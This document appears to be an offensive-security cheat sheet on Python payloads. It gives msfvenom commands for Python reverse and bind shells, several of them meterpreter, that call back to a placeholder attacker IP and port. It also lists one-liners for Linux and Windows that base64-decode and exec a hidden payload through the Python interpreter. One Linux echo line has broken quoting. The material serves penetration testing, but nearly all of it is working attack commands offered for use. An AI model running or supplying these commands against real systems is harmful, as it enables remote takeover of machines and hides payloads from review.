---
author(s):
  - Userware
tags:
  - initial-access
  - weaponization
  - client-side-attacks
  - cross-platform
  - python
---
# Manual

> [!INFO] Preinstalled Interpreter
> The `python` interpreter is preinstalled across all of the GNU/Linux operating systems.

## 01 - Base64 Encoded

Encode the python payload.

```
$ basenc -w 0 --base64 payload.py

$ base64 -w 0 payload.py

$ openssl enc -a -e -A -in payload.py

$ openssl enc -base64 -A -in payload.py
```

## 02 - Generate Payloads

### 2.1 - Cross Platform

#### 2.1.1 - Generate a payload via `msfvenom`

##### 2.1.1.1 - Reverse Shells

Stageless TCP reverse shell.

```
$ msfvenom -p python/shell_reverse_tcp lhost=<IP> lport=<PORT> -o payload.py

$ msfvenom -p python/shell_reverse_tcp_ssl lhost=<IP> lport=<PORT> -o payload.py
```

Stageless UDP reverse shell.

```
$ msfvenom -p python/shell_reverse_udp lhost=<IP> lport=<PORT> -o payload.py
```

Staged TCP reverse shell.

```
$ msfvenom -p python/meterpreter/reverse_tcp lhost=<IP> lport=<PORT> -o payload.py

$ msfvenom -p python/meterpreter/reverse_tcp_ssl lhost=<IP> lport=<PORT> -o payload.py
```

Stageless HTTP reverse shell.

```
$ msfvenom -p python/meterpreter_reverse_http lhost=<IP> lport=<PORT> -o payload.py
```

Staged HTTP reverse shell.

```
$ msfvenom -p python/meterpreter/reverse_http lhost=<IP> lport=<PORT> -o payload.py
```

Stageless HTTP via TLS reverse shell.

```
$ msfvenom -p python/meterpreter_reverse_https handlersslcert=[/path/to/file.pem] sslversion=[Auto | TLS | SSL23 | SSL3 | TLS1 | TLS1.1 | TLS1.2] lhost=<IP> lport=<PORT> -o payload.py
```

Staged HTTP via TLS reverse shell.

```
$ msfvenom -p python/meterpreter/reverse_https handlersslcert=[/path/to/file.pem] sslversion=[Auto | TLS | SSL23 | SSL3 | TLS1 | TLS1.1 | TLS1.2] lhost=<IP> lport=<PORT> -o payload.py
```

##### 2.1.1.2 - Bind Shells

```
$ msfvenom -p python/shell_bind_tcp lport=<PORT> -o payload.py
```

### 2.2 - Linux

#### 2.2.1 - Reverse Shells

##### 2.2.1.1 - Generate a payload via `msfvenom`

```
$ msfvenom -p cmd/unix/reverse_python lhost=<IP> lport=<PORT>

$ msfvenom -p cmd/unix/reverse_python_ssl handlersslcert=[/path/to/file.pem] sslversion=[Auto | TLS | SSL23 | SSL3 | TLS1 | TLS1.1 | TLS1.2] lhost=<IP> lport=<PORT>
```

## 03 - Execute Payloads

> [!TIP]
> On windows, you can combine with a enumeration function to check one of the [[Compilers|compilers]] exist in order to execute the payload especially when the target is windows.

### 3.1 - Cross Platform

Single quote

```
> python -c 'exec "<base64_payload>".decode("base64")'
```

Double quote

```
> python -c "exec '<base64_payload>'.decode('base64')"

> python -c "exec( __import__('base64').decodestring('<base64_payload>'))"

> python -c "import base64,sys;exec(base64.b64decode({2:str,3:lambda b:bytes(b, 'UTF-8')}[sys.version_info[0]]('<base64_payload>')))"
```

One-line Base64 (ANSI-C Quoting)

```
> python -c $'exec \'<base64_payload>\'.decode(\'base64\')'
```

One-line Base64

```
> python -c "exec \"<base64_payload>\".decode(\"base64\")"
```

### 3.2 - Linux

Single quote

```
$ echo "exec('<base64_payload>').decode('base64')) | python"
```

Heredoc Base64

```
$ python - << EOF
exec '<base64_payload>'.decode('base64')
EOF

$ python - << EOF
exec "<base64_payload>".decode("base64")
EOF
```

### 3.3 - Windows

Single quote

```
> py -c 'exec "<base64_payload>".decode("base64")'
```

Double quote

```
> py -c "exec '<base64_payload>'.decode('base64')"

> py -c "exec( __import__('base64').decodestring('<base64_payload>'))"

> py -c "import base64,sys;exec(base64.b64decode({2:str,3:lambda b:bytes(b, 'UTF-8')}[sys.version_info[0]]('<base64_payload>')))"
```

One-line Base64 (ANSI-C Quoting)

```
> py -c $'exec \'<base64_payload>\'.decode(\'base64\')'
```

One-line Base64

```
> py -c "exec \"<base64_payload>\".decode(\"base64\")"
```

---
## References

### GTFOBins

- [GTFOBins: Python](https://gtfobins.github.io/gtfobins/python/)

### Hacktricks

- [Hacktricks: Shells Linux](https://book.hacktricks.wiki/en/generic-hacking/reverse-shells/linux.html)

### don't code me on that

- [don't code me on that: Python Reverse Shells](https://medium.com/dont-code-me-on-that/bunch-of-shells-python-b3fb1400b823)

### PuckieStyle

- [PuckieStyle: Python one-line b64 Shellcode](https://www.puckiestyle.nl/python-one-line-shellcode/)

### Pentest Monkey

- [Reverse Shell Cheatsheet Pentestmonkey](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)